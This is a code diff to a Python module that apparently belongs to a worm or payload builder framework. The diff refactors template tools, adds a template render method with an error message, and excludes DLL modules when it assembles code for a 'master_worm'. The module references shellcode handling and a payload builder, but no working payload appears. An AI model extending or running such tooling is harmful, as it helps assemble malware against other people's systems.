@@ -8,25 +8,26 @@ from .tools.starter import Starter
 from .tools.shadow import Shadow
 from .tools.garbage_man_var import GarbageMan
 from .tools.pay_builder import PayloadBuilder
-from .tools.coder_template_tools.template_tools import TT_MOD_Generator
 
-class TempTools:
-    def __init__(self, coder: object):
-        self.coder = coder
-        self.generator = TT_MOD_Generator(self)
+from .tools.coder_template_tools.master_tool import MasterTempTool
+
+# class TempTools:
+#     def __init__(self, coder: object):
+#         self.coder = coder
+#         self.generator = TT_MOD_Generator(self)
     
-    def var_len(self, variable: object) -> int:
-        return len(variable)
+#     def var_len(self, variable: object) -> int:
+#         return len(variable)
     
-    def shellcode_len(self, variable: object) -> int:
-        scode = variable.split(", ")
-        return len(scode)
+#     def shellcode_len(self, variable: object) -> int:
+#         scode = variable.split(", ")
+#         return len(scode)
     
-    def generate_text(self, src_data: list) -> str:
-        return self.generator.generate_text(src_data)
+#     def generate_text(self, src_data: list) -> str:
+#         return self.generator.generate_text(src_data)
     
-    def build_asm_scvar(self, src_data: list, shellcode: str, var_name: str, table_name: str) -> str:
-        return self.generator.build_asm_var_shellcode(src_data, shellcode, var_name, table_name)
+#     def build_asm_scvar(self, src_data: list, shellcode: str, var_name: str, table_name: str, arch: str = "x86") -> str:
+#         return self.generator.build_asm_var_shellcodex(src_data, shellcode, var_name, table_name, arch)
     
 
 
@@ -44,7 +45,7 @@ class Coder:
         self.starter = Starter(self)
         self.shadow = Shadow(self)
         self.garbage_man = GarbageMan(self)
-        self.temp_tools = TempTools(self)
+        self.temp_tools = MasterTempTool(self)
         
  
     @property
@@ -55,7 +56,8 @@ class Coder:
     def globalVar(self) -> dict:
         gv = self.global_var.copy()
         gv.update(self.WB.globalVar)
-        gv.update(self.WB.raw_worm.process.options)
+        # ######
+        # gv.update(self.WB.raw_worm.process.options)
         return gv
     
     @property
@@ -178,7 +180,19 @@ class Coder:
             code = code.render(var)
         # if len(mod.coderOpt) > 0:
         #     code = self.format_code(code, mod.coderOpt)
-        return code 
+        return code
+
+    # New render
+    def render_single_template(self, code_temp: str, var: dict = {}):
+        try:
+            code = Template(code_temp)
+            code = code.render(**var, TOOL=self.temp_tools)
+            return code
+        except Exception as e:
+            self.msg("error", f"[!!] ERROR render template: {e} [!!]")
+            return code_temp
+    
+
 
     
         
@@ -191,8 +205,12 @@ class Coder:
             # exclusion loaders
             if mod.subTypes == "loader":
                 continue
+            if mod.subTypes == "dll":
+                continue
             codes.append(self.render_single(mod, var))
         for smod in self.WB.raw_worm.support.values():
+            if smod.subTypes == "dll":
+                continue
             codes.append(self.render_single(smod, var))
         codes.append(self.render_single(self.WB.raw_worm.master_worm, var))
         return "\n".join(codes)
